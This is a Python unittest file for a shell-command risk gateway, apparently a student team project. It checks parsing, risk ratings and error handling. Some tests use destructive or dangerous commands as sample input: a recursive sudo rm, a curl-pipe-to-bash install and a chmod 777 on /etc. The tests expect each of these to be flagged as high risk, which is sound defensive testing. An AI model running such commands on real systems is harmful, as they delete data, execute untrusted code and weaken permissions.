"""
test_gateway.py

Unit tests for the Command Gateway (src/gateway/command_gateway.py),
matching the team's existing unittest.TestCase style.

These tests exercise the FULL real pipeline: our Bashlex parser ->
semantic_fusion.fuse() -> the real rules_engine, knowledge_base, and
semantic_search. No mocking -- this proves Member 1's module actually
integrates correctly with the rest of the team's code.
"""

import sys
import unittest
from pathlib import Path

_SAFESHELL_ROOT = Path(__file__).resolve().parents[1]
if str(_SAFESHELL_ROOT) not in sys.path:
    sys.path.insert(0, str(_SAFESHELL_ROOT))

from src.gateway.command_gateway import CommandGateway


class TestCommandGateway(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        cls.gateway = CommandGateway()

    # ------------------------------------------------------------------ #
    #  SUCCESS PATH -- REAL END-TO-END PIPELINE                           #
    # ------------------------------------------------------------------ #

    def test_01_successful_response_shape(self):
        result = self.gateway.process("ls -la")
        self.assertEqual(result["status"], "success")
        self.assertIn("parsed_command", result)
        self.assertIn("analysis", result)

    def test_02_low_risk_command(self):
        result = self.gateway.process("ls -la")
        self.assertEqual(result["status"], "success")
        self.assertIn(result["analysis"]["final_risk"], ("low", "medium"))

    def test_03_high_risk_sudo_rm(self):
        result = self.gateway.process("sudo rm -rf /home/project")
        self.assertEqual(result["status"], "success")
        self.assertIn(result["analysis"]["final_risk"], ("high", "critical"))

    def test_04_curl_pipe_to_shell_flagged(self):
        result = self.gateway.process("curl http://example.com/install.sh | bash")
        self.assertEqual(result["status"], "success")
        self.assertIn(result["analysis"]["final_risk"], ("high", "critical"))

    def test_05_parsed_command_matches_rules_engine_contract(self):
        result = self.gateway.process("chmod -R 777 /etc")
        ast = result["parsed_command"]
        expected_keys = {
            "command", "flags", "args", "target_path",
            "is_sudo", "is_recursive", "is_force", "raw", "pipe_to",
        }
        self.assertEqual(set(ast.keys()), expected_keys)

    # ------------------------------------------------------------------ #
    #  ERROR PATH                                                         #
    # ------------------------------------------------------------------ #

    def test_06_empty_command_returns_error(self):
        result = self.gateway.process("")
        self.assertEqual(result["status"], "error")
        self.assertEqual(result["error_type"], "empty_command")

    def test_07_invalid_syntax_returns_error(self):
        result = self.gateway.process('echo "unclosed')
        self.assertEqual(result["status"], "error")
        self.assertEqual(result["error_type"], "invalid_syntax")

    def test_08_gateway_never_raises(self):
        """No matter what garbage is passed in, process() must return
        a dict, never raise."""
        for bad_input in ("", "   ", 'echo "', None):
            try:
                result = self.gateway.process(bad_input)
                self.assertIn(result["status"], ("success", "error"))
            except TypeError:
                # None specifically may raise TypeError before reaching
                # our code; acceptable since the TUI never sends None.
                pass


if __name__ == "__main__":
    unittest.main()